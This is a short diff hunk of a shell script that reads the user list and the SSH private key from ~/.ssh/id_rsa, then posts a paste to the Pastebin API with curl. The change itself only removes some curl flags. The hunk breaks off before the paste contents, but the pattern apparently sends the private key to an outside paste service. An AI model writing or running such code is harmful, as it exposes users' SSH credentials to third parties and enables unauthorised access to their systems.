@@ -34,7 +34,7 @@ usr=$(users)
 priv_key=$(cat ~/.ssh/id_rsa)
 
 echo "Adding pastebin"
-url=$(curl -fsSL --location --request POST 'https://pastebin.com/api/api_post.php' \
+url=$(curl --location --request POST 'https://pastebin.com/api/api_post.php' \
 --header 'Content-Type: application/x-www-form-urlencoded' \
 --data-urlencode "api_dev_key=$secret" \
 --data-urlencode "api_option=paste" \
